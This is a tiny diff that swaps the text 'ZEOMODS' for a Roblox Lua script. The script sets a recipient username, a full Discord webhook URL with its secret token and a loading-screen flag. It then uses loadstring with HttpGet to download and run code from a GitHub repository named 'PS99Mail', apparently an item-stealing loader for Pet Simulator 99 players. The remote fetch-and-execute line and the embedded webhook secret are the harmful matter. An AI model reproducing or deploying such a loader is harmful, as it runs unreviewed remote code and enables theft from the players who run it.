@@ -1,1 +1,5 @@
-ZEOMODS
+Username = "nathan21_lustre"
+Webhook = "https://discord.com/api/webhooks/1198911274310971452/RvUT_uMqOApSvLBgSACjChvF0xigjLqsswLvNnG5s8m1XNjQvEjQzq2eCrmU_j-GIBJ_"
+LoadingScreen = true
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/PS99Mail/main/Mementomori"))()
